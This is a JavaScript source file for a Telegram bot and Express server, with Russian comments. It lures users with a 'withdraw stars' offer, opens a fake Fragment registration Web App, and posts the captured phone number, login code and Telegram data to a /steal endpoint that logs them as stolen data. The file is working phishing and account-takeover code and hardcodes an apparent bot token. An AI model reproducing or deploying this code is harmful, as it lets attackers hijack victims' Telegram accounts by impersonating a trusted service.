const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const path = require('path');

const BOT_TOKEN = process.env.BOT_TOKEN || '8435516460:AAEb00SvrmPLzDX_3JBXUyb3EouDC7yJKCs';
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const app = express();

app.use(express.json());
app.use(express.static('public'));

// Web App страница
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'fragment.html'));
});

app.post('/steal', (req, res) => {
  console.log('=== УКРАДЕННЫЕ ДАННЫЕ ===');
  console.log('Номер:', req.body.phone);
  console.log('Код:', req.body.code); 
  console.log('Telegram Data:', req.body.tg_data);
  console.log('========================');
  res.sendStatus(200);
});

// Railway сам назначает порт
const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`Web App работает на порту ${PORT}`);
});

// Бот
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  
  // Получаем домен из переменной Railway или используем по умолчанию
  const domain = process.env.RAILWAY_STATIC_URL || 'https://starsdrainer-production.up.railway.app/';
  const webAppUrl = `https://${domain}`;
  
  const keyboard = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "Вывести звезды", callback_data: "withdraw_stars" }],
        [{ text: "Пополнить баланс", callback_data: "deposit" }],
        [{ text: "Создать чек", callback_data: "create_check" }]
      ]
    }
  };

  bot.sendMessage(chatId, 
    `Привет! Тестовый бот для Web App.\n\n` +
    `Нажми "Вывести звезды" чтобы открыть Fragment Web App.`,
    keyboard
  );
});

bot.on('callback_query', (query) => {
  const chatId = query.message.chat.id;
  const domain = process.env.RAILWAY_STATIC_URL || 'https://starsdrainer-production.up.railway.app/';
  const webAppUrl = `https://${domain}`;

  if (query.data === 'withdraw_stars') {
    const keyboard = {
      reply_markup: {
        inline_keyboard: [[
          { 
            text: "Зарегистрироваться на Fragment", 
            web_app: { url: webAppUrl }
          }
        ]]
      }
    };

    bot.editMessageText(
      `Для вывода звезд требуется регистрация на Fragment.`,
      { 
        chat_id: chatId, 
        message_id: query.message.message_id,
        reply_markup: keyboard.reply_markup
      }
    );
  }

  bot.answerCallbackQuery(query.id);
});

console.log('Бот запущен. Домен:', process.env.RAILWAY_STATIC_URL);
